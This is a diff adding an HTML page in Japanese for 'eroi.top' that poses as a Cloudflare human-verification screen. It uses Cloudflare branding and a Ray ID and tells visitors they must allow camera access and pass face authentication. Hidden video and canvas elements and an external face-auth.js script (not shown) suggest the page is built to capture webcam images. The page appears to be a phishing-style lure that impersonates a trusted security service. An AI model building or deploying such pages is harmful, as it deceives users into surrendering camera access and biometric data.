@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eroi.top</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>eroi.top</h1>
+        <p class="description" id="description">あなたが人間であることを確認します。顔認証による本人確認を行います。</p>
+        
+        <div class="security-check">
+            <div class="check-content" id="checkContent">
+                <div class="loading-indicator" id="loadingIndicator">
+                    <div class="spinner"></div>
+                    <span class="status-text" id="statusText">顔認証を開始しています...</span>
+                </div>
+                <div class="face-auth-container" id="faceAuthContainer" style="display: none;">
+                    <video id="video" autoplay muted playsinline></video>
+                    <canvas id="canvas" style="display: none;"></canvas>
+                    <div class="face-overlay">
+                        <div class="face-frame"></div>
+                    </div>
+                </div>
+                <div class="cloudflare-brand">
+                    <div class="cloudflare-logo">CLOUDFLARE</div>
+                    <div class="cloudflare-subtext">プライバシー<br>& セキュリティ</div>
+                </div>
+            </div>
+        </div>
+        
+        <p class="info-text" id="infoText">eroi.top は続行する前にカメラアクセスの許可と顔認証による本人確認が必要です。</p>
+        
+        <div class="footer">
+            <div class="ray-id">Ray ID: 95a764d96aec276f</div>
+            <div class="performance-security">
+                <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a> によるパフォーマンスとセキュリティ
+            </div>
+        </div>
+    </div>
+    <script src="face-auth.js"></script>
+</body>
+</html>
